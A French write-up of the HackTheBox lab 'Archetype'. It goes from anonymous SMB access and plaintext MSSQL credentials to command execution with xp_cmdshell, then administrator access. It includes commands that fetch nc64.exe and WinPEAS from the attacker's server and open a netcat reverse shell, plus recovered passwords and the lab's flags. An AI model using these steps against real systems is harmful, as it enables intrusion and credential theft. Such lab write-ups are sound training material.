# Write-up -- HackTheBox : Archetype

Write-up réalisé pour la machine Archetype de HackTheBox. L'objectif est d'exploiter un partage SMB accessible sans authentification pour y récupérer des credentials, puis d'en abuser pour obtenir une exécution de commandes via un serveur MSSQL, et finalement escalader jusqu'à Administrator.

L'IP de la machine pendant ma session était `10.129.85.13`.

---

## 1. Scan des ports ouverts

```bash
nmap -sV -sS 10.129.85.13
```

```
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

On a 5 ports ouverts. Les ports 139 et 445 correspondent à **SMB**, et le port **1433** héberge un serveur de base de données **Microsoft SQL Server 2017**. Le port 5985 est WinRM, qui pourra nous servir plus tard.

---

## 2. Énumération des partages SMB

Le port 445 étant ouvert, on liste les partages disponibles sans s'authentifier :

```bash
smbclient -L //10.129.85.13
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

Les partages `ADMIN$` et `C$` sont des partages administratifs par défaut. Le seul partage non-administratif est **backups**.

---

## 3. Récupération des credentials dans le partage SMB

On se connecte au partage `backups` sans mot de passe :

```bash
smbclient //10.129.85.13/backups
```

```
smb: \> ls
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020
```

Un seul fichier : `prod.dtsConfig`. Les fichiers `.dtsConfig` sont des fichiers de configuration qui contiennent souvent des chaînes de connexion en clair. On le lit directement depuis le shell SMB :

```bash
smb: \> more prod.dtsConfig
```

```xml
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..."
        GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property"
        Path="\Package.Connections[Destination].Properties[ConnectionString]"
        ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
        Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;
        Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

On a un couple de credentials en clair.

- **Utilisateur :** `ARCHETYPE\sql_svc`
- **Mot de passe :** `M3g4c0rp123`

---

## 4. Script de connexion

En effectuant une recherche web, on trouve rapidement **mssqlclient.py**. L'emplacement par défaut est : /usr/share/doc/python3-impacket/examples/mssqlclient.py.

---

## 5. Connexion au serveur MSSQL et activation de xp_cmdshell

On utilise `mssqlclient.py` pour s'authentifier sur le serveur SQL avec ces credentials. L'option `-windows-auth` est nécessaire car l'utilisateur est un compte Windows :

```bash
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py \
    -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.129.85.13
```

```
[*] Encryption required, switching to TLS
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)>
```

On est connecté. La commande `help` révèle que le client supporte `xp_cmdshell`, une procédure stockée étendue de MSSQL qui permet d'exécuter des commandes Windows directement depuis une requête SQL.

`xp_cmdshell` est désactivé par défaut. On l'active via la commande intégrée au client :

```sql
SQL> enable_xp_cmdshell
```

On vérifie que l'exécution de commandes fonctionne :

```sql
SQL (ARCHETYPE\sql_svc  dbo@msdb)> xp_cmdshell "powershell -c pwd"
```

```
Path
----
C:\Windows\system32
```

---

## 6. Script d'Escalade de Privilèges

Ces scripts d'escalade sont bien connus, pour linux il s'agit de LinPEAS et il existe l'équivalent pour Windows : **WinPEAS**.

---

## 7. Recherche du mot de passe Administrator

Pour obtenir un vrai shell interactif, on va uploader `nc64.exe` (netcat pour Windows) sur la cible. On démarre d'abord un serveur HTTP sur notre machine depuis le répertoire où se trouve `nc64.exe` :

```bash
python3 -m http.server 8000
```

Puis on le télécharge sur la cible avec `Invoke-WebRequest` (l'équivalent Windows de `wget`) :

```sql
SQL> xp_cmdshell "powershell -c Invoke-WebRequest -Uri 'http://10.10.15.30:8000/nc64.exe' -Outfile C:\Users\Public\nc.exe"
```

On ouvre un listener sur notre machine :

```bash
nc -lvnp 4444
```

Puis on déclenche le reverse shell depuis la cible :

```sql
SQL> xp_cmdshell "C:\Users\Public\nc.exe -e cmd.exe 10.10.15.30 4444"
```

```
connect to [10.10.15.30] from (UNKNOWN) [10.129.85.13] 49678
Microsoft Windows [Version 10.0.17763.2061]

C:\Windows\system32>
```

On a un shell interactif en tant que `sql_svc`.

On essaie d'accéder au répertoire `C:\Users\Administrator` mais l'accès est refusé. Il faut escalader nos privilèges. On utilise **WinPEAS**.

On l'upload avec la même méthode que `nc64.exe` :

```powershell
C:\Users\Public> powershell -c Invoke-WebRequest -Uri "http://10.10.15.30:8000/winpeas.exe" -Outfile C:\Users\Public\winpeas.exe
```

Puis on l'exécute. Dans les résultats, WinPEAS signale un fichier d'historique PowerShell :

```
PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS history size: 79B
```

`ConsoleHost_history.txt` est l'équivalent de `.bash_history` sous Linux : il enregistre les commandes PowerShell tapées par l'utilisateur. On le lit :

```powershell
C:\Users\Public> powershell -c Get-Content C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

L'utilisateur avait monté le partage `backups` en tant qu'Administrator, et la commande est restée dans l'historique.

- **Utilisateur :** `administrator`
- **Mot de passe :** `MEGACORP_4dm1n!!`

---

## 8. Flag User

En explorant le système de fichiers, on trouve le flag utilisateur dans le bureau de `sql_svc` :

```powershell
C:\Users\sql_svc\Desktop> powershell -c Get-Content user.txt
```

**Flag user :** `3e7b102e78218e935bf3f4951fec21a3`

---

## 9. Connexion en tant qu'Administrator et flag root

On utilise `evil-winrm` pour se connecter via WinRM (port 5985 qu'on avait repéré au début) avec les credentials Administrator :

```bash
evil-winrm -i 10.129.85.13 -u administrator -p 'MEGACORP_4dm1n!!'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
b91ccec3305e98240082d4474b848528
```

**Flag root :** `b91ccec3305e98240082d4474b848528`
